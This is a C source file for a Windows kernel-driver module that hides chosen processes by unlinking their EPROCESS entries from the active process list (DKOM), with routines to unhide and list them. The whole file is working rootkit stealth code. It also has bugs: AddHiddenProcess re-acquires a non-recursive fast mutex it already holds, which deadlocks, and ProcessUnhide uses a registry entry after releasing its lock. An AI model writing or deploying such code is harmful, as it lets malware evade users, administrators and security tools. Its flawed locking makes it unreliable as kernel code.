#include "ProcessModule.h"
#include "Offsets.h"
#include <ntddk.h>

NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId,
                                                PEPROCESS *Process);

//
// Registry of hidden processes. Each entry keeps the original
// ActiveProcessLinks node so the process can be re-linked later
//
typedef struct _HIDDEN_PROCESS_ENTRY {
  ULONG ProcessId;
  PLIST_ENTRY OriginalLinks;
} HIDDEN_PROCESS_ENTRY, *PHIDDEN_PROCESS_ENTRY;

static HIDDEN_PROCESS_ENTRY g_HiddenProcesses[MAX_HIDDEN_PROCESSES];
static ULONG g_HiddenProcessCount = 0;
static FAST_MUTEX g_HiddenListLock;

static BOOLEAN IsValidProcessId(ULONG ProcessId) {
  return ProcessId > SYSTEM_PROCESS_PID;
}

static BOOLEAN IsProcessHidden(ULONG ProcessId) {
  BOOLEAN found = FALSE;
  ULONG i;

  ExAcquireFastMutex(&g_HiddenListLock);
  for (i = 0; i < g_HiddenProcessCount; i++) {
    if (g_HiddenProcesses[i].ProcessId == ProcessId) {
      found = TRUE;
      break;
    }
  }
  ExReleaseFastMutex(&g_HiddenListLock);

  return found;
}

static BOOLEAN AddHiddenProcess(ULONG ProcessId, PLIST_ENTRY OriginalLinks) {
  BOOLEAN success = FALSE;

  ExAcquireFastMutex(&g_HiddenListLock);

  if (IsProcessHidden(ProcessId))
    goto exit;

  if (g_HiddenProcessCount >= MAX_HIDDEN_PROCESSES)
    goto exit;

  g_HiddenProcesses[g_HiddenProcessCount].ProcessId = ProcessId;
  g_HiddenProcesses[g_HiddenProcessCount].OriginalLinks = OriginalLinks;
  g_HiddenProcessCount++;
  success = TRUE;

exit:
  ExReleaseFastMutex(&g_HiddenListLock);
  return success;
}

static BOOLEAN RemoveHiddenProcess(ULONG ProcessId) {
  ULONG i;

  ExAcquireFastMutex(&g_HiddenListLock);

  for (i = 0; i < g_HiddenProcessCount; i++) {
    if (g_HiddenProcesses[i].ProcessId == ProcessId) {
      g_HiddenProcesses[i] = g_HiddenProcesses[g_HiddenProcessCount - 1];
      g_HiddenProcessCount--;
      ExReleaseFastMutex(&g_HiddenListLock);
      return TRUE;
    }
  }

  ExReleaseFastMutex(&g_HiddenListLock);
  return FALSE;
}

// ProcessModuleInitialize sets up the hidden-process registry and resolves the
// EPROCESS offsets required by the DKOM routines.

NTSTATUS ProcessModuleInitialize(VOID) {
  NTSTATUS status;

  ExInitializeFastMutex(&g_HiddenListLock);
  g_HiddenProcessCount = 0;

  status = OffsetsInitialize();
  if (!NT_SUCCESS(status))
    DbgPrint("Failed to query OS build: 0x%X\n", status);

  DbgPrint("ProcessModule initialized.\n");
  return STATUS_SUCCESS;
}

//  clears the hidden-process registry.

VOID ProcessModuleCleanup(VOID) {
  ExAcquireFastMutex(&g_HiddenListLock);
  g_HiddenProcessCount = 0;
  ExReleaseFastMutex(&g_HiddenListLock);

  DbgPrint("ProcessModule cleaned up.\n");
}

// ProcessHide removes a process from the active process list

NTSTATUS ProcessHide(ULONG ProcessId) {
  NTSTATUS status = STATUS_SUCCESS;
  PEPROCESS targetProcess = NULL;
  ULONG activeLinksOffset = GetActiveProcessLinksOffset();
  ULONG lockOffset = GetProcessLockOffset();

  if (!IsValidProcessId(ProcessId))
    return STATUS_INVALID_PARAMETER;

  // Build/architecture not supported by the offset table.
  if (activeLinksOffset == 0 || lockOffset == 0)
    return STATUS_UNSUCCESSFUL;

  if (IsProcessHidden(ProcessId))
    return STATUS_SUCCESS;

  status = PsLookupProcessByProcessId(ULongToHandle(ProcessId), &targetProcess);
  if (!NT_SUCCESS(status))
    return status;

  PLIST_ENTRY processListEntry =
      (PLIST_ENTRY)((PUCHAR)targetProcess + activeLinksOffset);
  PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((PUCHAR)targetProcess + lockOffset);

  if (!AddHiddenProcess(ProcessId, processListEntry)) {
    ObDereferenceObject(targetProcess);
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  // Guard the list manipulation with the process list lock.
  ExAcquirePushLockExclusive(listLock);

  __try {
    RemoveEntryList(processListEntry);
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    status = GetExceptionCode();
    RemoveHiddenProcess(ProcessId);
    ExReleasePushLockExclusive(listLock);
    ObDereferenceObject(targetProcess);
    DbgPrint("Hide process %lu faulted: 0x%X\n", ProcessId, status);
    return status;
  }

  // Isolate the unlinked node as a self-loop so nothing can walk through it.
  processListEntry->Flink = processListEntry;
  processListEntry->Blink = processListEntry;

  ExReleasePushLockExclusive(listLock);
  ObDereferenceObject(targetProcess);

  DbgPrint("Hidden process %lu.\n", ProcessId);
  return STATUS_SUCCESS;
}

//  ProcessUnhide re-links a previously hidden process back into the active
//  process list
NTSTATUS ProcessUnhide(ULONG ProcessId) {
  NTSTATUS status = STATUS_SUCCESS;
  PEPROCESS systemProcess = NULL;
  PHIDDEN_PROCESS_ENTRY entry = NULL;
  ULONG activeLinksOffset = GetActiveProcessLinksOffset();
  ULONG lockOffset = GetProcessLockOffset();
  ULONG i;

  if (!IsValidProcessId(ProcessId))
    return STATUS_INVALID_PARAMETER;

  if (activeLinksOffset == 0 || lockOffset == 0)
    return STATUS_UNSUCCESSFUL;

  // Resolve the saved list node for the given PID.
  ExAcquireFastMutex(&g_HiddenListLock);
  for (i = 0; i < g_HiddenProcessCount; i++) {
    if (g_HiddenProcesses[i].ProcessId == ProcessId) {
      entry = &g_HiddenProcesses[i];
      break;
    }
  }
  ExReleaseFastMutex(&g_HiddenListLock);

  if (!entry)
    return STATUS_NOT_FOUND;

  // Anchor the insert at the System process, the head of the active list.
  status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID),
                                      &systemProcess);
  if (!NT_SUCCESS(status))
    return status;

  PLIST_ENTRY processListEntry =
      (PLIST_ENTRY)((PUCHAR)systemProcess + activeLinksOffset);
  PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((PUCHAR)systemProcess + lockOffset);

  ExAcquirePushLockExclusive(listLock);
  InsertHeadList(processListEntry, entry->OriginalLinks);
  ExReleasePushLockExclusive(listLock);
  ObDereferenceObject(systemProcess);

  RemoveHiddenProcess(ProcessId);

  DbgPrint("Revealed process %lu.\n", ProcessId);
  return STATUS_SUCCESS;
}

NTSTATUS ProcessListHidden(PPROCESS_LIST_RESPONSE Response) {
  ULONG i;

  if (!Response)
    return STATUS_INVALID_PARAMETER;

  ExAcquireFastMutex(&g_HiddenListLock);
  Response->Count = g_HiddenProcessCount;
  for (i = 0; i < g_HiddenProcessCount; i++)
    Response->ProcessIds[i] = g_HiddenProcesses[i].ProcessId;
  ExReleaseFastMutex(&g_HiddenListLock);

  return STATUS_SUCCESS;
}